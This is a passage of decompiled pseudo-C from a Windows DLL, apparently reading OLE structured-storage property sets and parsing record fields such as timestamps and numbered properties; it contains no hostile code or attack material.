  v36 = (*(int (__stdcall **)(int, _DWORD, _DWORD, PROPVARIANT *))(*(_DWORD *)v41[0] + 12))(
          v41[0],
          *(unsigned __int16 *)(a2 + 4),
          *(_DWORD *)(a2 + 12),
          rgvars);
  if ( !v36 )
  {
    v7 = *(_WORD *)(a2 + 4) == 0;
    v40 = 0;
    if ( !v7 )
    {
      v37 = rgvars;
      do
      {
        v8 = sub_1003C281(v28, (int)v37);
        LOBYTE(v42) = 6;
        sub_10001236(v8 + 1, &v39);
        LOBYTE(v42) = 5;
        sub_1000D3AD(v28);
        if ( *(_DWORD *)(v39 + 28) )
        {
          v9 = *(_DWORD *)(a2 + 16);
          if ( v9 == 1 )
          {
            switch ( *(_DWORD *)(*(_DWORD *)(a2 + 12) + 8 * v40 + 4) )
            {
              case 4:
                v32 = 2;
                v15 = sub_1000B261((int)&v38, (int)v26, 0);
                LOBYTE(v42) = 7;
                (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v32, v15);
                LOBYTE(v42) = 5;
                v11 = v26;
                goto LABEL_28;
              case 5:
                v30 = 8;
                v14 = sub_1000B261((int)&v38, (int)v27, 0);
                LOBYTE(v42) = 8;
                (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v30, v14);
                LOBYTE(v42) = 5;
                v11 = v27;
                goto LABEL_28;
              case 7:
                v34 = 16;
                v13 = sub_1000B261((int)&v38, (int)v21, 0);
                LOBYTE(v42) = 9;
                (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v34, v13);
                LOBYTE(v42) = 5;
                v11 = v21;
                goto LABEL_28;
              case 8:
                v29 = 4;
                v12 = sub_1000B261((int)&v38, (int)v25, 0);
                LOBYTE(v42) = 10;
                (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v29, v12);
                LOBYTE(v42) = 5;
                v11 = v25;
                goto LABEL_28;
              case 9:
                v31 = 128;
                v10 = sub_1000B261((int)&v38, (int)v23, 0);
                LOBYTE(v42) = 11;
                (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v31, v10);
                LOBYTE(v42) = 5;
                v11 = v23;
LABEL_28:
                sub_1000B3DF((int *)v11);
                break;
            }
          }
          else if ( v9 == 2 )
          {
            if ( *(_DWORD *)(*(_DWORD *)(a2 + 12) + 8 * v40 + 4) == 14 )
            {
              v33 = 32;
              v17 = sub_1000B261((int)&v38, (int)v22, 0);
              LOBYTE(v42) = 12;
              (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v33, v17);
              LOBYTE(v42) = 5;
              v11 = v22;
              goto LABEL_28;
            }
            if ( *(_DWORD *)(*(_DWORD *)(a2 + 12) + 8 * v40 + 4) == 15 )
            {
              v35 = 64;
              v16 = sub_1000B261((int)&v38, (int)v24, 0);
              LOBYTE(v42) = 13;
              (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v35, v16);
              LOBYTE(v42) = 5;
              v11 = v24;
              goto LABEL_28;
            }
          }
        }
        v18 = *(unsigned __int16 *)(a2 + 4);
        ++v40;
        ++v37;
      }
      while ( v40 < v18 );
    }
  }
  v19 = FreePropVariantArray(0xAu, rgvars);
  v5 = sub_1003C676(v19, v36);
  LOBYTE(v42) = 2;
  sub_1000D3AD(&v38);
LABEL_3:
  LOBYTE(v42) = 0;
  if ( v41[0] )
    (*(void (__stdcall **)(int))(*(_DWORD *)v41[0] + 8))(v41[0]);
  v42 = -1;
  sub_1004745B(&a3);
  return v5;
}
// 1003C2E6: using guessed type int var_14[4];

//----- (1003C5E7) --------------------------------------------------------
Concurrency::details::UMSFreeThreadProxyFactory *__stdcall sub_1003C5E7(
        Concurrency::details::UMSFreeThreadProxyFactory *a1,
        int a2,
        __int16 a3)
{
  int v4[10]; // [esp+0h] [ebp-28h] BYREF

  v4[6] = (int)v4;
  sub_1000D372(v4, a2);
  v4[9] = -1;
  sub_1004AF1C((int)a1, a3, v4[0], v4[1]);
  *((_DWORD *)a1 + 14) = 0;
  *(_DWORD *)a1 = &off_10103CB0;
  return a1;
}
// 10103CB0: using guessed type int (__thiscall *off_10103CB0)(void *Block, char);

//----- (1003C636) --------------------------------------------------------
Concurrency::details::UMSFreeThreadProxyFactory *__thiscall sub_1003C636(
        Concurrency::details::UMSFreeThreadProxyFactory *Block,
        char a2)
{
  sub_1003C652(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003C652) --------------------------------------------------------
void __thiscall sub_1003C652(Concurrency::details::UMSFreeThreadProxyFactory *this)
{
  *(_DWORD *)this = &off_10103CB0;
  Concurrency::details::UMSFreeThreadProxyFactory::~UMSFreeThreadProxyFactory(this);
}
// 10103CB0: using guessed type int (__thiscall *off_10103CB0)(void *Block, char);

//----- (1003C676) --------------------------------------------------------
int __userpurge sub_1003C676@<eax>(__int32 a1@<eax>, int a2)
{
  int v2; // ecx
  int v4; // [esp-8h] [ebp-2Ch] BYREF
  int v5; // [esp-4h] [ebp-28h]
  void *v6; // [esp+14h] [ebp-10h]
  int v7; // [esp+20h] [ebp-4h]

  sub_10029BC2(a1);
  if ( !a2 )
    return 0;
  if ( a2 != 1 )
  {
    v5 = v2;
    v4 = v2;
    v6 = &v4;
    sub_1000728E(&v4, 0);
    v7 = -1;
    sub_1004F7E6((_DWORD *)dword_10182DE8, 109, a2, v4, v5);
  }
  return 2;
}
// 1003C692: variable 'v2' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1003C6C7) --------------------------------------------------------
int __thiscall sub_1003C6C7(_DWORD *this)
{
  size_t v2; // eax
  __int32 v3; // eax
  int v4; // ecx
  __int32 v5; // eax
  int v6; // esi
  int result; // eax
  int v8; // ecx
  int v9[6]; // [esp-4h] [ebp-30h] BYREF
  void *ppObjectOpen; // [esp+14h] [ebp-18h] BYREF
  int *v11; // [esp+18h] [ebp-14h]
  int v12; // [esp+28h] [ebp-4h]

  v2 = sub_1000D687((int)(this + 12));
  if ( !v2 || v2 > 0x104 )
  {
    result = 100;
    this[11] = 100;
    return result;
  }
  ppObjectOpen = 0;
  v12 = 1;
  v3 = StgOpenStorageEx(*(const WCHAR **)(this[13] + 12), 0x20u, 5u, 0, 0, 0, &riid, &ppObjectOpen);
  if ( v3 )
  {
    v9[0] = v3;
LABEL_8:
    v5 = sub_1003C676(v3, v9[0]);
    goto LABEL_9;
  }
  if ( ppObjectOpen )
  {
    v9[0] = 0;
    goto LABEL_8;
  }
  v5 = 101;
LABEL_9:
  this[14] = v5;
  if ( !v5 )
  {
    v9[0] = v4;
    v11 = v9;
    sub_1003C7EB(v9, (int *)&ppObjectOpen);
    LOBYTE(v12) = 1;
    v5 = sub_1003C2E6((int)this, (int)&dword_10186C88, v9[0]);
    this[14] = v5;
    if ( !v5 )
    {
      v9[0] = v8;
      v11 = v9;
      sub_1003C7EB(v9, (int *)&ppObjectOpen);
      LOBYTE(v12) = 1;
      v5 = sub_1003C2E6((int)this, (int)&dword_10186C74, v9[0]);
      this[14] = v5;
    }
  }
  v6 = sub_1003C676(v5, v5);
  v12 = -1;
  sub_1004745B((int *)&ppObjectOpen);
  return v6;
}
// 1003C776: variable 'v4' is possibly undefined
// 1003C7A5: variable 'v8' is possibly undefined
// 10186C74: using guessed type int dword_10186C74;
// 10186C88: using guessed type int dword_10186C88;

//----- (1003C7EB) --------------------------------------------------------
int *__stdcall sub_1003C7EB(int *a1, int *a2)
{
  int v2; // eax
  bool v3; // zf

  v2 = *a2;
  v3 = *a2 == 0;
  *a1 = *a2;
  if ( !v3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v2 + 4))(v2);
  return a1;
}

//----- (1003C819) --------------------------------------------------------
char __userpurge sub_1003C819@<al>(_DWORD *a1@<ebx>, int a2)
{
  int v3; // esi
  unsigned __int16 v4; // ax
  int v5; // esi
  int v6; // [esp+0h] [ebp-8h]
  __int16 v7; // [esp+4h] [ebp-4h] BYREF
  __int16 v8; // [esp+6h] [ebp-2h]

  if ( a1[3] < 6u )
    return 0;
  v3 = (unsigned __int16)sub_1000B746(a1, 0);
  if ( a1[3] <= (unsigned int)(v3 + 2) )
    return 0;
  v4 = sub_1000B746(a1, v3);
  if ( v4 > 0x64u || a1[3] < v3 + 2 * (unsigned int)v4 + 6 )
    return 0;
  v5 = v3 + 4;
  v6 = v4 + 1;
  do
  {
    v7 = 0;
    v8 = 0;
    v7 = sub_1000B746(a1, v5 - 2);
    v8 = sub_1000B746(a1, v5);
    (*(void (__thiscall **)(int, __int16 *))(*(_DWORD *)a2 + 36))(a2, &v7);
    v5 += 2;
    --v6;
  }
  while ( v6 );
  return 1;
}

//----- (1003C8A8) --------------------------------------------------------
char __thiscall sub_1003C8A8(void *this, int a2, unsigned __int64 a3, _DWORD *a4, int a5, int a6)
{
  unsigned int v7; // esi
  unsigned int v8; // edi
  int v9; // edi
  int v10; // edi
  int v11; // eax
  LONG *v12; // eax
  int v13; // esi
  _DWORD *v14; // eax
  const void *v15; // eax
  char *v16; // esi
  int v18[6]; // [esp+10h] [ebp-60h] BYREF
  __int64 v19[3]; // [esp+28h] [ebp-48h] BYREF
  int v20[10]; // [esp+44h] [ebp-2Ch] BYREF
  int v21; // [esp+6Ch] [ebp-4h]

  v7 = a3 >> 5;
  if ( (a3 & 0x1F) != 0
    || (v8 = HIDWORD(a3) >> 5,
        (unsigned int)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) <= __PAIR64__(v8, v7)) )
  {
    memset(v19, 0, sizeof(v19));
    v13 = a5;
    memset(v18, 0, sizeof(v18));
    if ( (*(unsigned __int8 (__thiscall **)(int, unsigned __int64 *))(*(_DWORD *)a5 + 8))(a5, &a3) )
    {
      v14 = (_DWORD *)(*(int (__thiscall **)(int, unsigned __int64 *))(*(_DWORD *)v13 + 20))(v13, &a3);
      v15 = (const void *)sub_1000B4B8(v14);
      memcpy(v19, v15, sizeof(v19));
      v16 = (char *)(a2 + 64);
      if ( sub_1004B47E((char *)(a2 + 64), v19[1], SHIDWORD(v19[1]), v18) )
      {
        v12 = (LONG *)sub_1004B91A((int)v16, v20, (int)v18);
        v21 = 1;
        goto LABEL_11;
      }
      v20[5] = v19[1] & 1;
      if ( (v19[1] & 1) != 0 && sub_1004B47E(v16, LODWORD(v19[1]) - 1, (unsigned __int64)(v19[1] - 1) >> 32, v18) )
      {
        v12 = (LONG *)sub_1004B91A((int)v16, v20, (int)v18);
        v21 = 2;
        goto LABEL_11;
      }
    }
  }
  else
  {
    v9 = *(unsigned __int16 *)((*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 48))(this, v7) + 2);
    v10 = v9 - *(unsigned __int16 *)(*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 48))(this, v7);
    v11 = *(unsigned __int16 *)(*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 48))(this, v7);
    if ( a4[3] > (unsigned int)(v11 + v10) )
    {
      v12 = (LONG *)sub_1000B6B7(a4, (int)v20, v11, v10);
      v21 = 0;
LABEL_11:
      sub_1000B3BD(v12, a6);
      v21 = -1;
      sub_1000B3DF(v20);
      return 1;
    }
  }
  return 0;
}

//----- (1003CA1A) --------------------------------------------------------
int __stdcall sub_1003CA1A(int a1, int a2, int a3, int a4, int a5, volatile LONG *a6, int a7)
{
  int v7; // eax
  int v8; // eax
  _DWORD *v9; // esi
  int v10; // eax
  _DWORD *v11; // eax
  int v13; // [esp-8h] [ebp-30h] BYREF
  int v14; // [esp-4h] [ebp-2Ch]
  void *v15; // [esp+10h] [ebp-18h]
  void *Block; // [esp+14h] [ebp-14h]
  int v17; // [esp+24h] [ebp-4h]

  sub_100309B0((_DWORD *)a1, a7);
  v17 = 0;
  *(_DWORD *)a1 = &off_10103D9C;
  Block = operator new(0x14u);
  LOBYTE(v17) = 1;
  if ( Block )
  {
    v13 = v14;
    v15 = &v13;
    sub_1000D372(&v13, a2);
    LOBYTE(v17) = 1;
    v7 = sub_1001187B((int)Block, v13, v14);
  }
  else
  {
    v7 = 0;
  }
  LOBYTE(v17) = 0;
  sub_10050B91((_DWORD *)(a1 + 56), v7);
  LOBYTE(v17) = 3;
  sub_1004C619((_DWORD *)(a1 + 64));
  LOBYTE(v17) = 4;
  sub_10015814((_DWORD *)(a1 + 100));
  LOBYTE(v17) = 5;
  sub_1004C619((_DWORD *)(a1 + 116));
  LOBYTE(v17) = 6;
  sub_10050B91((_DWORD *)(a1 + 152), 0);
  *(_BYTE *)(a1 + 160) = 0;
  *(_DWORD *)(a1 + 164) = &unk_100FF618;
  v8 = a7;
  *(_DWORD *)(a1 + 168) = a7;
  *(_DWORD *)(a1 + 172) = 0;
  LOBYTE(v17) = 8;
  *(_DWORD *)(a1 + 176) = 0;
  *(_DWORD *)(a1 + 180) = 0;
  *(_DWORD *)(a1 + 184) = v8;
  *(_DWORD *)(a1 + 188) = 2000000;
  *(_DWORD *)(a1 + 192) = a3;
  *(_DWORD *)(a1 + 196) = a4;
  *(_DWORD *)(a1 + 200) = a5;
  *(_DWORD *)(a1 + 204) = a6;
  a7 = a1 + 208;
  sub_1004C883((_DWORD *)(a1 + 208));
  *(_DWORD *)(a1 + 252) = 1;
  *(_DWORD *)(a1 + 256) = 0;
  memset((void *)(a1 + 244), 0, 8u);
  LOBYTE(v17) = 11;
  a6 = *(volatile LONG **)(a1 + 60);
  a5 = *(_DWORD *)(a1 + 56);
  InterlockedIncrement(a6);
  LOBYTE(v17) = 13;
  v9 = (_DWORD *)(a1 + 152);
  if ( *(_DWORD *)(a1 + 152) != a5 )
  {
    sub_10040447((int)v9);
    *(_DWORD *)(a1 + 156) = a6;
    *v9 = a5;
    InterlockedIncrement(*(volatile LONG **)(a1 + 156));
  }
  LOBYTE(v17) = 11;
  sub_10020B81(&a5);
  v10 = sub_1004B727(a1 + 64);
  if ( v10 )
  {
    v11 = sub_1002E75C(&a5, v10);
    LOBYTE(v17) = 14;
    sub_1002EB83((int)v11, 190);
  }
  return a1;
}
// 10103D9C: using guessed type int (__thiscall *off_10103D9C)(void *Block, char);
// 1003CA1A: using guessed type _DWORD arg_8;

//----- (1003CBC5) --------------------------------------------------------
_DWORD *__thiscall sub_1003CBC5(_DWORD *Block, char a2)
{
  sub_1003CC01(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003CBE1) --------------------------------------------------------
void __stdcall sub_1003CBE1(_DWORD *a1)
{
  sub_1003E23D(a1);
}

//----- (1003CC01) --------------------------------------------------------
void __thiscall sub_1003CC01(_DWORD *this)
{
  *this = &off_10103D9C;
  sub_1003CBE1(this + 52);
  sub_1004AF94(this + 16);
  sub_10020B81(this + 14);
  sub_10030A22(this);
}
// 10103D9C: using guessed type int (__thiscall *off_10103D9C)(void *Block, char);

//----- (1003CC55) --------------------------------------------------------
int __thiscall sub_1003CC55(int *this, _DWORD *a2)
{
  _QWORD *v3; // esi
  int v4; // eax
  int v5; // eax
  bool v6; // cf
  int v9[8]; // [esp+10h] [ebp-20h] BYREF

  memset(v9, 0, sizeof(v9));
  v3 = this + 44;
  if ( sub_1004BE36(this + 16, this + 44, v9) == 1 )
  {
    memset(this + 61, 0, 8u);
    v4 = this[52];
    this[64] = 0;
    (*(void (__thiscall **)(int *))(v4 + 28))(this + 52);
    v5 = dword_10175B28++;
    this[64] = v5;
    if ( sub_1003CD33((int)this, this + 52, (int)v9) )
    {
      ++*v3;
LABEL_9:
      *a2 = this + 52;
      a2[1] = 52;
      return 0;
    }
    while ( sub_1004BE36(this + 16, this + 44, v9) )
    {
      if ( sub_10030AAC((int)this) )
        return 4;
      v6 = __CFADD__((*(_DWORD *)v3)++, 1);
      this[45] += v6;
      if ( sub_1003CD33((int)this, this + 52, (int)v9) )
        goto LABEL_9;
    }
  }
  return 2;
}
// 10175B28: using guessed type int dword_10175B28;

//----- (1003CD33) --------------------------------------------------------
char __stdcall sub_1003CD33(int a1, _DWORD *a2, int a3)
{
  unsigned int v3; // eax
  int v4; // edi
  size_t v5; // esi
  LONG *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  bool v9; // bl
  _DWORD *v10; // eax
  bool v11; // bl
  _DWORD *v12; // eax
  bool v13; // bl
  int *v15; // eax
  int v16; // ecx
  int v17; // eax
  SYSTEMTIME *v18; // eax
  LONG *v19; // eax
  LONG *v20; // eax
  LONG *v21; // eax
  LONG *v22; // eax
  LONG *v23; // eax
  LONG *v24; // eax
  LONG *v25; // eax
  LONG *v26; // eax
  LONG *v27; // eax
  LONG *v28; // eax
  LONG *v29; // eax
  LONG *v30; // eax
  LONG *v31; // eax
  LONG *v32; // eax
  LONG *v33; // eax
  LONG *v34; // eax
  int v35[5]; // [esp+10h] [ebp-E4h] BYREF
  LONG v36[5]; // [esp+24h] [ebp-D0h] BYREF
  int v37[5]; // [esp+38h] [ebp-BCh] BYREF
  _DWORD v38[9]; // [esp+4Ch] [ebp-A8h] BYREF
  _DWORD v39[9]; // [esp+70h] [ebp-84h] BYREF
  int v40; // [esp+94h] [ebp-60h] BYREF
  LONG v41; // [esp+98h] [ebp-5Ch] BYREF
  SYSTEMTIME v42; // [esp+9Ch] [ebp-58h] BYREF
  int v43; // [esp+B0h] [ebp-44h] BYREF
  struct _SYSTEMTIME v44; // [esp+B4h] [ebp-40h] BYREF
  bool v45; // [esp+C7h] [ebp-2Dh]
  int v46[4]; // [esp+C8h] [ebp-2Ch] BYREF
  int v47; // [esp+D8h] [ebp-1Ch] BYREF
  int v48; // [esp+DCh] [ebp-18h]
  int v49; // [esp+F0h] [ebp-4h]

  sub_1000B1F3(0, (int)&v42, 0);
  v49 = 0;
  sub_1003E47E(v46);
  LOBYTE(v49) = 1;
  sub_1003EC22(v39);
  LOBYTE(v49) = 2;
  sub_1003E71F(v38);
  LOBYTE(v49) = 3;
  if ( !sub_1003D74B(&v42, a1, a3, (int)v46)
    || (v3 = ((unsigned int)sub_1000B6F2(&v42, 4) >> 5) + 1, v46[1] <= v3)
    || (v4 = *(unsigned __int16 *)(*(int (__thiscall **)(int *, unsigned int))(v46[0] + 44))(v46, v3),
        v5 = *(_DWORD *)&v42.wSecond,
        v5 <= v4 + sub_1000D687((int)&unk_10186CA8)) )
  {
    LOBYTE(v49) = 2;
    sub_1003E765(v38);
    LOBYTE(v49) = 1;
    sub_1003EC9D(v39);
    LOBYTE(v49) = 0;
LABEL_16:
    sub_1003E4D0((int)v46);
    v49 = -1;
    sub_1000B3DF((int *)&v42);
    return 0;
  }
  v45 = **(_BYTE **)(a1 + 164) == 23;
  sub_1000B1F3(0, (int)v37, 0);
  LOBYTE(v49) = 5;
  v6 = (LONG *)sub_1000B67C(&v42, (int)&v43, v4, dword_10186CA4);
  LOBYTE(v49) = 6;
  sub_1000B3BD(v6, (int)v37);
  LOBYTE(v49) = 5;
  sub_1000B3DF(&v43);
  v49 = 4;
  sub_1000D17D(&v40, &word_10175B2C);
  LOBYTE(v49) = 8;
  if ( v45 )
  {
    v7 = sub_1000D230(v37, &v47);
    LOBYTE(v49) = 9;
  }
  else
  {
    v7 = sub_1000D2FA(&v47, 0);
    LOBYTE(v49) = 10;
  }
  sub_10001236(v7 + 1, &v41);
  LOBYTE(v49) = 8;
  sub_1000D3AD(&v47);
  v8 = sub_1000D836(*(_DWORD *)(dword_10186CAC + 28), (int)&v40, &v47, 0);
  LOBYTE(v49) = 11;
  v9 = sub_1000D65C((int)&unk_10186CA8, (int)v8) == 0;
  LOBYTE(v49) = 8;
  sub_1000D3AD(&v47);
  if ( v9 )
  {
    v48 = 1;
  }
  else
  {
    v10 = sub_1000D836(*(_DWORD *)(dword_10186CB4 + 28), (int)&v40, &v47, 0);
    LOBYTE(v49) = 12;
    v11 = sub_1000D65C((int)&unk_10186CB0, (int)v10) == 0;
    LOBYTE(v49) = 8;
    sub_1000D3AD(&v47);
    if ( v11 )
    {
      v48 = 2;
    }
    else
    {
      v12 = sub_1000D836(*(_DWORD *)(dword_10186CBC + 28), (int)&v40, &v47, 0);
      LOBYTE(v49) = 13;
      v13 = sub_1000D65C((int)&unk_10186CB8, (int)v12) == 0;
      LOBYTE(v49) = 8;
      sub_1000D3AD(&v47);
      if ( !v13 )
      {
LABEL_15:
        LOBYTE(v49) = 4;
        sub_1000D3AD(&v40);
        LOBYTE(v49) = 3;
        sub_1000B3DF(v37);
        LOBYTE(v49) = 2;
        sub_1003E765(v38);
        LOBYTE(v49) = 1;
        sub_1003EC9D(v39);
        LOBYTE(v49) = 0;
        goto LABEL_16;
      }
      v48 = 3;
    }
  }
  a2[11] = v48;
  if ( !sub_1003D7B0((int)v46, a1, a3, &v42, (int)v39, (int)v38) )
    goto LABEL_15;
  v15 = sub_1003D660(v39, a1, &v44.wHour, &v42, 57, v46, (int)v38);
  v16 = *v15;
  v17 = v15[1];
  a2[9] = v16;
  a2[10] = v17;
  v18 = sub_1004C84F(&v44, (int)a2);
  if ( !sub_1002FC2C(*v18, *(SYSTEMTIME *)(a1 + 192)) )
    goto LABEL_15;
  v19 = (LONG *)sub_1003D53E(a1, &v43, &v42, 55, (int)v39, v46, (int)v38);
  LOBYTE(v49) = 14;
  sub_1004C829(v19, (int)a2, 3);
  LOBYTE(v49) = 8;
  sub_1000B3DF(&v43);
  v20 = (LONG *)sub_1003D53E(a1, &v43, &v42, 4, (int)v39, v46, (int)v38);
  LOBYTE(v49) = 15;
  sub_1004C829(v20, (int)a2, 1);
  LOBYTE(v49) = 8;
  sub_1000B3DF(&v43);
  v21 = (LONG *)sub_1003D53E(a1, &v43, &v42, 31, (int)v39, v46, (int)v38);
  LOBYTE(v49) = 16;
  sub_1004C829(v21, (int)a2, 5);
  LOBYTE(v49) = 8;
  sub_1000B3DF(&v43);
  v22 = (LONG *)sub_1003D53E(a1, &v43, &v42, 66, (int)v39, v46, (int)v38);
  LOBYTE(v49) = 17;
  sub_1004C829(v22, (int)a2, 0);
  LOBYTE(v49) = 8;
  sub_1000B3DF(&v43);
  v23 = (LONG *)sub_1003D53E(a1, &v43, &v42, 3, (int)v39, v46, (int)v38);
  LOBYTE(v49) = 18;
  sub_1004C829(v23, (int)a2, 2);
  LOBYTE(v49) = 8;
  sub_1000B3DF(&v43);
  v24 = (LONG *)sub_1003D53E(a1, &v43, &v42, 125, (int)v39, v46, (int)v38);
  LOBYTE(v49) = 19;
  sub_1004C829(v24, (int)a2, 9);
  LOBYTE(v49) = 8;
  sub_1000B3DF(&v43);
  sub_1003D53E(a1, v35, &v42, 0, (int)v39, v46, (int)v38);
  LOBYTE(v49) = 20;
  if ( v35[3] )
    sub_1004C829(v35, (int)a2, 6);
  sub_1000B1F3(0, (int)v36, 0);
  LOBYTE(v49) = 21;
  if ( sub_1003D8A7(a1, a3, (int)v36) )
    sub_1004C829(v36, (int)a2, 10);
  v25 = (LONG *)sub_1003D53E(a1, &v43, &v42, 30, (int)v39, v46, (int)v38);
  LOBYTE(v49) = 22;
  sub_1004C829(v25, (int)a2, 11);
  LOBYTE(v49) = 21;
  sub_1000B3DF(&v43);
  v26 = (LONG *)sub_1003D53E(a1, &v43, &v42, 101, (int)v39, v46, (int)v38);
  LOBYTE(v49) = 23;
  sub_1004C829(v26, (int)a2, 12);
  LOBYTE(v49) = 21;
  sub_1000B3DF(&v43);
  if ( v48 == 2 || v48 == 3 )
  {
    v27 = (LONG *)sub_1003D53E(a1, &v43, &v42, 26, (int)v39, v46, (int)v38);
    LOBYTE(v49) = 24;
    sub_1004C829(v27, (int)a2, 14);
    LOBYTE(v49) = 21;
    sub_1000B3DF(&v43);
    v28 = (LONG *)sub_1003D9EE(v39, a1, &v43, &v42, 7, v46, (int)v38);
    LOBYTE(v49) = 25;
    sub_1004C829(v28, (int)a2, 16);
    LOBYTE(v49) = 21;
    sub_1000B3DF(&v43);
    v29 = (LONG *)sub_1003D9EE(v39, a1, &v43, &v42, 8, v46, (int)v38);
    LOBYTE(v49) = 26;
    sub_1004C829(v29, (int)a2, 17);
    LOBYTE(v49) = 21;
    sub_1000B3DF(&v43);
    v30 = (LONG *)sub_1003D9EE(v39, a1, &v43, &v42, 96, v46, (int)v38);
    LOBYTE(v49) = 27;
    sub_1004C829(v30, (int)a2, 18);
    LOBYTE(v49) = 21;
    sub_1000B3DF(&v43);
    v31 = (LONG *)sub_1003D9EE(v39, a1, &v43, &v42, 97, v46, (int)v38);
    LOBYTE(v49) = 28;
    sub_1004C829(v31, (int)a2, 19);
    LOBYTE(v49) = 21;
    sub_1000B3DF(&v43);
    v32 = (LONG *)sub_1003D53E(a1, &v43, &v42, 36, (int)v39, v46, (int)v38);
    LOBYTE(v49) = 29;
    sub_1004C829(v32, (int)a2, 15);
    LOBYTE(v49) = 21;
    sub_1000B3DF(&v43);
    v33 = (LONG *)sub_1003D53E(a1, &v43, &v42, 129, (int)v39, v46, (int)v38);
    LOBYTE(v49) = 30;
    sub_1004C829(v33, (int)a2, 20);
    LOBYTE(v49) = 21;
    sub_1000B3DF(&v43);
    v34 = (LONG *)sub_1003D53E(a1, &v43, &v42, 131, (int)v39, v46, (int)v38);
    LOBYTE(v49) = 31;
    sub_1004C829(v34, (int)a2, 22);
    LOBYTE(v49) = 21;
    sub_1000B3DF(&v43);
  }
  LOBYTE(v49) = 20;
  sub_1000B3DF(v36);
  LOBYTE(v49) = 8;
  sub_1000B3DF(v35);
  LOBYTE(v49) = 4;
  sub_1000D3AD(&v40);
  LOBYTE(v49) = 3;
  sub_1000B3DF(v37);
  LOBYTE(v49) = 2;
  sub_1003E765(v38);
  LOBYTE(v49) = 1;
  sub_1003EC9D(v39);
  LOBYTE(v49) = 0;
  sub_1003E4D0((int)v46);
  v49 = -1;
  sub_1000B3DF((int *)&v42);
  return 1;
}
// 10186CA4: using guessed type int dword_10186CA4;
// 10186CAC: using guessed type int dword_10186CAC;
// 10186CB4: using guessed type int dword_10186CB4;
// 10186CBC: using guessed type int dword_10186CBC;
// 1003CD33: using guessed type _DWORD var_84[9];
// 1003CD33: using guessed type _DWORD var_A8[9];
// 1003CD33: using guessed type int var_BC[5];
// 1003CD33: using guessed type LONG var_D0[5];

//----- (1003D53E) --------------------------------------------------------
void *__stdcall sub_1003D53E(int a1, void *a2, _DWORD *a3, char a4, int a5, void *a6, int a7)
{
  int v7; // ecx
  LONG *v8; // eax
  size_t v9; // eax
  void *v11; // [esp-4h] [ebp-58h]
  int v12[5]; // [esp+10h] [ebp-44h] BYREF
  int v13[3]; // [esp+24h] [ebp-30h] BYREF
  unsigned int v14; // [esp+30h] [ebp-24h]
  int v15; // [esp+38h] [ebp-1Ch] BYREF
  unsigned int v16; // [esp+3Ch] [ebp-18h]
  int v17; // [esp+40h] [ebp-14h]
  int v18; // [esp+50h] [ebp-4h]

  v17 = 0;
  sub_1000B1F3(0, (int)v13, 0);
  v18 = 1;
  sub_1003D714(a5, (int)&v15, a4);
  if ( (_WORD)v15 && sub_1003C8A8(a6, a1, v16, a3, a7, (int)v13) && v14 && (_WORD)v15 == 30 )
  {
    if ( v14 > 2 && *(_BYTE *)sub_1000B4CB((int)v13, v7, 0) == 1 )
    {
      v8 = (LONG *)sub_1000B6B7(v13, (int)v12, 2, v14 - 2);
      LOBYTE(v18) = 2;
      sub_1000B3BD(v8, (int)v13);
      LOBYTE(v18) = 1;
      sub_1000B3DF(v12);
    }
    sub_1000D2FA(&v15, 0);
    LOBYTE(v18) = 3;
    v11 = *(void **)(v16 + 12);
    v9 = sub_1000D687((int)&v15);
    sub_1000B1F3((void *)(2 * v9), (int)a2, v11);
    v17 = 1;
    LOBYTE(v18) = 1;
    sub_1000D3AD(&v15);
  }
  else
  {
    sub_1000B36F(v13, (int)a2);
    v17 = 1;
  }
  LOBYTE(v18) = 0;
  sub_1000B3DF(v13);
  return a2;
}
// 1003D5BB: variable 'v7' is possibly undefined
// 1003D53E: using guessed type int var_30[3];
// 1003D53E: using guessed type int var_44[5];

//----- (1003D660) --------------------------------------------------------
_DWORD *__thiscall sub_1003D660(void *this, int a2, _DWORD *a3, _DWORD *a4, char a5, void *a6, int a7)
{
  const void *v7; // eax
  _DWORD *result; // eax
  int v9[5]; // [esp+10h] [ebp-30h] BYREF
  __int16 v10; // [esp+24h] [ebp-1Ch] BYREF
  unsigned int v11; // [esp+28h] [ebp-18h]
  int v12[2]; // [esp+2Ch] [ebp-14h] BYREF
  int v13; // [esp+3Ch] [ebp-4h]

  v12[0] = 0;
  v12[1] = 0;
  sub_1003D714((int)this, (int)&v10, a5);
  if ( v10 == 64 )
  {
    sub_1000B1F3((void *)8, (int)v9, 0);
    v13 = 0;
    if ( sub_1003C8A8(a6, a2, v11, a4, a7, (int)v9) && v9[3] == 8 )
    {
      v7 = (const void *)sub_1000B4B8(v9);
      memcpy(v12, v7, sizeof(v12));
      *a3 = v12[0];
      a3[1] = v12[1];
      v13 = -1;
      sub_1000B3DF(v9);
      return a3;
    }
    v13 = -1;
    sub_1000B3DF(v9);
  }
  result = a3;
  *a3 = v12[0];
  a3[1] = v12[1];
  return result;
}

//----- (1003D714) --------------------------------------------------------
int __userpurge sub_1003D714@<eax>(int a1@<ebx>, int a2@<esi>, char a3)
{
  int *v3; // eax
  int v4; // ecx
  int v5; // eax

  *(_WORD *)a2 = 0;
  *(_DWORD *)(a2 + 4) = 0;
  if ( (*(unsigned __int8 (__thiscall **)(int, char *))(*(_DWORD *)a1 + 8))(a1, &a3) )
  {
    v3 = (int *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)a1 + 20))(a1, &a3);
    v4 = *v3;
